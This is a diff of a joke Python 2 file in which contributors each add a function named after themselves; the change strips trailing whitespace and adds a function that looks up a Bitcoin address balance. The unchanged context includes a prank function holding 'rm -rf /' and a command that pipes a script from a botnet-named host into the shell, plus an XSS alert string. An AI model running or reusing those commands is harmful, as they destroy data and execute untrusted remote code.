@@ -55,7 +55,7 @@ def doctorpangloss():
 def ankushsachdeva():
 	contents =open(__file__).read()
 	print re.findall('def .* :',contents)
-	
+
 def adelevie():
     pass
 
@@ -72,7 +72,7 @@ def sricola():
 def bencooling():
     print "I don't know Python; I don't belong here"
     zachlatta()
-    
+
 def kisom():
     def zgohr(city):
         weather = json.loads(requests.
@@ -97,7 +97,7 @@ def evinugur():
 def ncammarata():
     tweets = json.loads(requests.get("https://search.twitter.com/search.json?q=a").content)
     tweet = tweets['results'][0]['text']
-    print "Random Tweet:", tweet.encode('utf-8') 
+    print "Random Tweet:", tweet.encode('utf-8')
 
 # Generate a random nonsense word with a vowel:consolant ratio of 1:5
 def taylorlapeyre():
@@ -117,7 +117,7 @@ def taylorlapeyre():
 
 def kghose():
     import curses, time
-    
+
     def main_loop(window):
         window.clear()
         N = 100
@@ -131,15 +131,15 @@ def kghose():
             for n in xrange(2*this_prime, N+1, this_prime):
                 numbers[n] = None
                 paint_grid(window, numbers)
-          
+
             keep_finding = False
             for n in xrange(this_prime+1, N+1):
                 if numbers[n] is not None:
                     this_prime = n
                     keep_finding = True
                     break
-    
-    
+
+
     def paint_grid(window, numbers):
         for row in xrange(10):
             for col in xrange(10):
@@ -151,9 +151,9 @@ def kghose():
               window.addstr(row, 3*col, s)
         window.refresh()
         time.sleep(.1)
-    
+
     curses.wrapper(main_loop)
-    
+
 def jessex():
     os.execl("/bin/echo", "echo", "This is a long way to go for 'hello world' but life's about the journey.")
 
@@ -352,6 +352,11 @@ def HoLyVieR(nb, mod):
 
     return int(f % mod)
 
+def sturmeh(address):
+    uri = "http://blockchain.info/q/addressbalance/%s?confirmations=6"
+    r = requests.get(uri % address)
+    print("Balance of %s: %f BTC" % (address, (float(r.text) / 100000000)))
+
 def eddotman():
     a = range(5)
     for x in a:
@@ -374,25 +379,25 @@ def chris911():
 
 def PiersonBro():
     print "My bane was not capability it was randomness."
- 
+
 def dogukantufekci():
     print "This is the connected world."
     webbrowser.open('http://www.silverspore.com/wiki/images/1/12/Connected_world-medium.jpg')
-    
+
 def doboy(doboy_):
     if doboy == doboy_:
         doboy_('rm -rf /')
         doboy('sh <(curl botnet.beepboop.com/main.sh)')
     else:
         print doboy_
-        
+
 def ngokevin(shamelessadvertising):
     # I'm sleepy zzz.
     time.sleep(0)
     # Check for XSS.
     print '<script>alert("HAHAHA");</script>'
     import antigravity
-    
+
 def gardaud(func):
 	print "Should I execute func?"
 	if random.randrange(0,2) == 0:
@@ -423,7 +428,7 @@ def lax():
 
 def shazeline(name):
     print name + " is a pretty cool guy"
-    
+
 def matiasinsaurralde():
     print "hello, this is skynet"
 
@@ -456,7 +461,7 @@ def dmercer(number, start=2):
         if is_prime:
             sieve.append(n)
     return sieve
-    
+
 def ryanseys():
     try:
         ryanseys()
@@ -500,7 +505,7 @@ def danielnr(huehue):
 
 def windspy():
   print "'cross the GREAT WALL, we can reach every corner of the world' is just a big joke."
-  
+
 if __name__ == "__main__":
     heinzf(False) # this thing makes it hard to make sure stuff works, doesn't it?
     uiri() # Can I go first unless you're going to modify the file?
@@ -538,6 +543,7 @@ if __name__ == "__main__":
     eternalmatt()
     PiersonBro()
     ankushsachdeva()
+    sturmeh('1PeJz1mUuquoaqdfP7uHn87e8XCv5M4MTZ')
     aniketpant()
     jontonsoup()
     prezjordan()
@@ -554,6 +560,6 @@ if __name__ == "__main__":
     lax()
     danielnr()
     windspy()
-    
+
     # as per instructed, please leave this as the final function
     lafin()
